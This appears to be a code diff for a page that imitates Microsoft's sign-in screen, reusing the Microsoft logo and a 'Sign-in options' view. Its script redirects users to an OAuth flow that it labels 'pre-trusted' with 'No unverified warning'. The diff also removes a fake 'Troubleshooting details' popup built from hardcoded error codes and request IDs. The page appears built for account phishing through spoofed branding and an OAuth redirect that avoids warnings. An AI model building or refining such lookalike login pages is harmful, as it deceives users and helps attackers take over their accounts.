@@ -150,7 +150,50 @@
         margin-left: 16px;
         text-decoration: none;
     }
-    /* Sign-in Options View Styles */
+    .option-item {
+        display: flex;
+        align-items: center;
+        padding: 8px 0;
+        cursor: pointer;
+    }
+    .option-item:hover {
+        background-color: #f2f2f2;
+    }
+    .option-icon-container {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background-color: #f2f2f2;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 20px;
+        color: #333;
+        margin-right: 16px;
+    }
+    .option-text p { margin: 0; line-height: 1.4; }
+    .option-text .primary { font-size: 15px; color: #1b1b1b; }
+    .option-text .secondary { font-size: 12px; color: #5e5e5e; }
+    .troubleshooting-box {
+        display: none;
+        background-color: #ffffff;
+        padding: 24px;
+        margin-top: 16px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        font-size: 14px;
+        color: #1b1b1b;
+    }
+    .troubleshooting-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
+    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
+    .troubleshooting-body p { margin: 8px 0; }
+    .troubleshooting-body strong { font-weight: 600; }
+    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    /* ✅ Sign-in Options View Styles */
     .signin-option-item {
         display: flex;
         align-items: flex-start;
@@ -207,28 +250,6 @@
         display: flex;
         justify-content: center;
     }
-    /* ✅ POPUP BOX STYLES */
-    .troubleshooting-box {
-        display: none;
-        background-color: #ffffff;
-        padding: 24px;
-        margin-top: 16px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        font-size: 14px;
-        color: #1b1b1b;
-    }
-    .troubleshooting-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-    }
-    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
-    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
-    .troubleshooting-body p { margin: 8px 0; }
-    .troubleshooting-body strong { font-weight: 600; }
-    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
-    .troubleshooting-body a { color: #0067b8; text-decoration: none; }
-    .troubleshooting-body a:hover { text-decoration: underline; }
     .hidden { display: none !important; }
     .loading {
       text-align: center;
@@ -243,6 +264,10 @@
       animation: spin 1s linear infinite;
       margin: 0 auto;
     }
+    .mt-4 { margin-top: 1rem; }
+    .mt-3 { margin-top: 0.75rem; }
+    .mt-2 { margin-top: 0.5rem; }
+    .form-group { margin-bottom: 1rem; }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
@@ -254,7 +279,7 @@
   <div class="main-container">
     <div class="form-wrapper">
       <div class="form-box">
-        <!-- Email View (div1) -->
+        <!-- Email View -->
         <div id="div1">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign in</h1>
@@ -268,7 +293,19 @@
           </div>
         </div>
 
-        <!-- Sign-in Options View (div3) -->
+        <!-- Office OAuth Loading View -->
+        <div id="div2" class="hidden">
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Signing you in...</h1>
+          <div class="loading mt-4">
+            <div class="spinner"></div>
+            <p style="margin-top: 20px; color: #666;">
+              Redirecting to Office for authentication...
+            </p>
+          </div>
+        </div>
+
+        <!-- ✅ Sign-in Options View (div3) -->
         <div id="div3" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign-in options</h1>
@@ -306,18 +343,6 @@
             <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
           </div>
         </div>
-
-        <!-- Office OAuth Loading View (div2) -->
-        <div id="div2" class="hidden">
-          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-          <h1 class="mt-4">Signing you in...</h1>
-          <div class="loading mt-4">
-            <div class="spinner"></div>
-            <p style="margin-top: 20px; color: #666;">
-              Redirecting to Office for authentication...
-            </p>
-          </div>
-        </div>
       </div>
 
       <!-- "Sign-in options" Clickable Box -->
@@ -327,27 +352,6 @@
           <span>Sign-in options</span>
         </a>
       </div>
-
-      <!-- ✅ POPUP BOX (Troubleshooting) -->
-      <div class="troubleshooting-box" id="troubleshooting_box">
-        <div class="troubleshooting-header">
-            <h2>Troubleshooting details</h2>
-            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
-        </div>
-        <div class="troubleshooting-body">
-            <p>If you contact your administrator, send this info to them.</p>
-            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
-            <div id="error_details_for_copy">
-                <p><strong>Error Code:</strong> 50058</p>
-                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
-                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
-                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
-            </div>
-            <hr>
-            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
-            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
-        </div>
-      </div>
     </div>
   </div>
 
@@ -355,7 +359,6 @@
   <div class="page-footer">
     <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
     <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank">Privacy & cookies</a>
-    <a href="#" id="footer_dots_link">...</a>
   </div>
 
   <script>
@@ -370,9 +373,6 @@
         const nextBtn = document.getElementById('next');
         const signInOptionsLink = document.getElementById('sign_in_options_link');
         const backBtn = document.getElementById('options-view-back');
-        const troubleshootingBox = document.getElementById('troubleshooting_box');
-        const closeTroubleshootingBtn = document.getElementById('close_troubleshooting_btn');
-        const footerDotsLink = document.getElementById('footer_dots_link');
 
         // Office.com Pre-trusted OAuth Configuration
         const OFFICE_CONFIG = {
@@ -437,6 +437,8 @@
             console.log('🌐 Redirecting to Office.com pre-trusted OAuth...');
             console.log('🔗 URL:', officeOAuthUrl.toString());
             console.log('✅ Flow Type:', 'Office.com Pre-trusted (No unverified warning)');
+            console.log('📝 Nonce:', nonce);
+            console.log('📝 State:', state);
 
             // Redirect to Office OAuth
             setTimeout(() => {
@@ -445,7 +447,7 @@
             }, 1500);
         });
 
-        // Sign-in options card click - Show sign-in options view
+        // ✅ Sign-in options card click - Show sign-in options view
         optionsBox.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔍 Sign-in options clicked - Showing options');
@@ -455,7 +457,7 @@
             optionsBox.classList.add('hidden');
         });
 
-        // Sign-in options link click - Show sign-in options view
+        // ✅ Sign-in options link click - Show sign-in options view
         signInOptionsLink.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔍 Sign-in options link clicked - Showing options');
@@ -465,7 +467,7 @@
             optionsBox.classList.add('hidden');
         });
 
-        // Back button - Return to main sign-in view
+        // ✅ Back button - Return to main sign-in view
         backBtn.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔙 Back clicked - Returning to sign-in');
@@ -473,32 +475,6 @@
             div2.classList.add('hidden');
             div3.classList.add('hidden');
             optionsBox.classList.remove('hidden');
-        });
-
-        // ✅ FOOTER DOTS BUTTON - Show troubleshooting popup
-        footerDotsLink.addEventListener('click', function (e) {
-            e.preventDefault();
-            console.log('📋 Footer dots clicked - Showing troubleshooting popup');
-            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
-            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
-        });
-
-        // ✅ CLOSE TROUBLESHOOTING POPUP
-        closeTroubleshootingBtn.addEventListener('click', function () {
-            console.log('❌ Closing troubleshooting popup');
-            troubleshootingBox.style.display = 'none';
-        });
-
-        // ✅ COPY INFO TO CLIPBOARD
-        document.getElementById('copy_info_link').addEventListener('click', function (e) {
-            e.preventDefault();
-            const detailsNode = document.getElementById('error_details_for_copy');
-            const detailsText = detailsNode.innerText.trim().replace(/\s\s+/g, '\n');
-            navigator.clipboard.writeText(detailsText).then(() => {
-                const originalText = e.target.textContent;
-                e.target.textContent = 'Copied!';
-                setTimeout(() => { e.target.textContent = originalText; }, 2000);
-            });
         });
     });
   </script>
